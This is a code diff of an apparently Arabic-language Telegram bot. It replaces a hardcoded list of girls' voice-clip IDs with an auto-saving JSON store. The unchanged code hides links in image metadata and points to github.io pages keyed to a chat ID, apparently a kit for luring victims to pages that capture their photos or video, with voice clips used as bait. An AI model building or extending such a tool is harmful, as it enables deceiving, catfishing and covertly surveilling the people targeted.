@@ -1,5 +1,6 @@
 import telebot
 from telebot import types
+import json
 import os
 from PIL import Image, PngImagePlugin
 
@@ -11,6 +12,7 @@ if not BOT_TOKEN:
     raise ValueError("❌ خطأ: لم يتم العثور على متغير BOT_TOKEN في إعدادات السيرفر!")
 
 bot = telebot.TeleBot(BOT_TOKEN)
+DB_FILE = "voice_db.json"
 
 PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
 VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId/"
@@ -18,19 +20,19 @@ VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId/"
 user_states = {}
 user_data = {}
 
-# 🔒 مكتبة المعرفات الجديدة المستخرجة من لقطات الشاشة (جاهزة وتعمل 100%)
-GIRLS_LIBRARY = {
-    "مقطع 1": "AwACAgIAAxkBAAIIF2ojuGA5OfGJ8xllNjdq7PT5_eTMAAJSXAAC7OtASCDhG5TwKjeOwQ",
-    "مقطع 2": "AwACAgIAAxkBAAIIFmojuGBj27n6GGWkgb8u9-yb8bmRAAJQXAAC7OtASHTBn4h8WvpXOwQ",
-    "مقطع 3": "AwACAgIAAxkBAAIIGGojuGDZZe_xI-8nfLGz5Q1blEoAJTXAAC7OtASFwuV1PR2eIrOwQ",
-    "مقطع 4": "AwACAgIAAxkBAAIIGWojuGD5S2ZXP50FcZ_uLT7RzhidAAJUXAAC7OtASPR21_MwzZ3eOwQ",
-    "مقطع 5": "AwACAgIAAxkBAAIIGmojuGAn1-3VuvxbWkuvyP9ulNaYAAJWXAAC7OtASBKjwQUT3tHP0wQ",
-    "مقطع 6": "AwACAgIAAxkBAAIIG2ojuGDFC2mdBXffpu2gv1VuBvKjAAJXXAAC7OtASFwAASLLy3jkHzE",
-    "مقطع 7": "AwACAgIAAxkBAAIIHGojuGBlfYmSmm6d759s-enHS8DBAAJYXAAC7OtASGQrQYIMTMTDowQ",
-    "مقطع 8": "AwACAgIAAxkBAAIIHWojuGCclvPmlutJMd0S1TUpNOX2AAIOUAAC7OtISGEgGmL_MUpuOwQ",
-    "مقطع 9": "AwACAgIAAxkBAAIIHmojuGAsdZRzoceBd89X3n1UvtpaAAI2UAAC7OtISGb7tyB1rePD0wQ",
-    "مقطع 10": "AwACAgIAAxkBAAIIH2ojuGD3rU9ypF3NTmdko1chnzzaAAI4UAAC7OtISH6t-_RAIqniOwQ"
-}
+# --- إدارة قاعدة بيانات الأصوات (تلقائية ومحمية من الحذف) ---
+def load_db():
+    if os.path.exists(DB_FILE):
+        with open(DB_FILE, 'r', encoding='utf-8') as f:
+            try: 
+                return json.load(f)
+            except: 
+                return {}
+    return {}
+
+def save_db(db):
+    with open(DB_FILE, 'w', encoding='utf-8') as f: 
+        json.dump(db, f, indent=4, ensure_ascii=False)
 
 # --- دالة حقن الرابط في الصورة ---
 def hide_link_in_metadata(image_path, link, output_path):
@@ -55,6 +57,7 @@ def send_welcome(message):
 @bot.callback_query_handler(func=lambda call: True)
 def handle_query(call):
     chat_id = call.message.chat.id
+    db = load_db()
 
     if call.data == "inject_start":
         user_states[chat_id] = "waiting_for_image_inject"
@@ -65,28 +68,51 @@ def handle_query(call):
         bot.send_message(chat_id, f"🔗 الرابط المطلوب:\n{link}")
     
     elif call.data == "voice_menu":
+        if not db:
+            bot.answer_callback_query(call.id, "⚠️ لا توجد مقاطع محفوظة حالياً! قم بإرسال البصمات الصوتية للبوت ليتم حفظها تلقائياً.")
+            return
+        
         markup = types.InlineKeyboardMarkup(row_width=2)
-        for name in GIRLS_LIBRARY.keys():
+        # ترتيب الأزرار تصاعدياً من مقطع 1 إلى مقطع 10
+        sorted_keys = sorted(db.keys(), key=lambda x: int(x.split()[1]) if len(x.split()) > 1 and x.split()[1].isdigit() else 0)
+        for name in sorted_keys:
             markup.add(types.InlineKeyboardButton(name, callback_data=f"play:{name}"))
-        bot.edit_message_text("اختر المقطع:", chat_id, call.message.message_id, reply_markup=markup)
+            
+        bot.edit_message_text("اختر المقطع المطلوب تشغيله:", chat_id, call.message.message_id, reply_markup=markup)
         
     elif call.data.startswith("play:"):
         name = call.data.split(":")[1]
-        file_id = GIRLS_LIBRARY.get(name)
-        
-        try:
-            bot.send_voice(chat_id, file_id)
-        except Exception as e:
-            bot.answer_callback_query(call.id, f"❌ خطأ في تشغيل: {name}")
+        file_id = db.get(name)
+        if file_id:
+            try: 
+                bot.send_voice(chat_id, file_id)
+            except Exception as e: 
+                bot.answer_callback_query(call.id, "❌ الـ ID الخاص بهذا المقطع منتهي الصلاحية! يرجى إعادة إرسال المقطع للبوت لتحديثه.")
+        else:
+            bot.answer_callback_query(call.id, "❌ لم يتم العثور على المقطع.")
 
-# --- المعالج العام (صور، نصوص) ---
-@bot.message_handler(content_types=['photo', 'text'])
+# --- المعالج العام لاستلام الأصوات، الصور والنصوص ---
+@bot.message_handler(content_types=['photo', 'text', 'voice'])
 def handle_all(message):
     chat_id = message.chat.id
     state = user_states.get(chat_id)
+
+    # 1. ميزة الحفظ والتحديث التلقائي للمقاطع عند إرسالها للبوت
+    if message.voice:
+        db = load_db()
+        count = len(db) + 1
+        
+        # إذا كانت القاعدة ممتلئة بـ 10 مقاطع وتريد إعادة التحديث من البداية عند الإرسال من جديد
+        if count > 10:
+            count = 1
+            
+        name = f"مقطع {count}"
+        db[name] = message.voice.file_id
+        save_db(db)
+        bot.reply_to(message, f"✅ تم حفظ وتحديث الـ ID الخاص بـ ({name}) في ملف الحفظ بنجاح!")
     
-    # معالجة الحقن (خطوة 1: استلام الصورة)
-    if state == "waiting_for_image_inject" and message.photo:
+    # 2. معالجة الحقن (خطوة 1: استلام الصورة)
+    elif state == "waiting_for_image_inject" and message.photo:
         file_info = bot.get_file(message.photo[-1].file_id)
         downloaded = bot.download_file(file_info.file_path)
         img_path = f"img_{chat_id}.png"
@@ -95,7 +121,7 @@ def handle_all(message):
         user_states[chat_id] = "waiting_for_link"
         bot.reply_to(message, "تم حفظ الصورة، أرسل الرابط الآن:")
 
-    # معالجة الحقن (خطوة 2: استلام الرابط)
+    # 3. معالجة الحقن (خطوة 2: استلام الرابط)
     elif state == "waiting_for_link" and message.text:
         img_path = user_data.get(chat_id)
         out_path = f"out_{chat_id}.png"
